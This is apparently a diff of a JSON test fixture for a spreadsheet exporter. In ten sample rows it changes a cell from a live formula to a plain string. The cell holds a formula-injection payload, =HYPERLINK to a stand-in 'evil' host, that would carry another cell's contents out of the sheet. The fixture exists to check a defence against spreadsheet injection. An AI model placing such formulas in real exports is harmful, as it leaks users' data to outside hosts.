@@ -107,7 +107,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice0@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00002'",
@@ -171,7 +171,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice4@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00006'",
@@ -235,7 +235,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice8@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00010'",
@@ -299,7 +299,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice12@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00014'",
@@ -363,7 +363,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice16@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00018'",
@@ -427,7 +427,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice20@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00022'",
@@ -491,7 +491,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice24@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00026'",
@@ -555,7 +555,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice28@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00030'",
@@ -619,7 +619,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice32@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00034'",
@@ -683,7 +683,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice36@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00038'",
